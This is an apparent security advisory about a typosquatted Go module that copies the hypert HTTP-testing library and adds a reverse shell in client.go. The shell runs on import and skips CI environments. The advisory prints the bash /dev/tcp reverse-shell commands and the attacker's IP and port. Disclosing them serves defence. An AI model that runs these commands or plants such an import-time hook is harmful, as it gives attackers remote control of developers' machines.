details:
github.com/AbuTrikaa/hypert is a copy of the legitimate HTTP-testing library github.com/areknoster/hypert with a reverse shell added to client.go. The payload runs on import: an init() function calls qcJjJne() unless the CI environment variable is "true", so ordinary builds and tests on developer machines trigger it while most CI runners do not.

On Linux and macOS it starts /bin/bash with a /dev/tcp reverse shell to 18.192.100.80:41143 (v1.0.2: `bash -i >& /dev/tcp/<ip>/<port> 0>&1`; v1.0.3: an `exec 5<>/dev/tcp/<ip>/<port>` read-eval loop). On Windows it attempts a hidden PowerShell System.Net.Sockets.TCPClient reverse shell; that command string is incomplete in both versions and does not work.

The module and the GitHub account AbuTrikaa were created on 2025-05-17, minutes apart. It follows the same pattern as the earlier hypert/layout typosquats (MAL-2025-2544 to MAL-2025-2551): repackaged copies of legitimate modules published under throwaway accounts. Both tagged versions are malicious and were still served by proxy.golang.org on 2026-11-02.
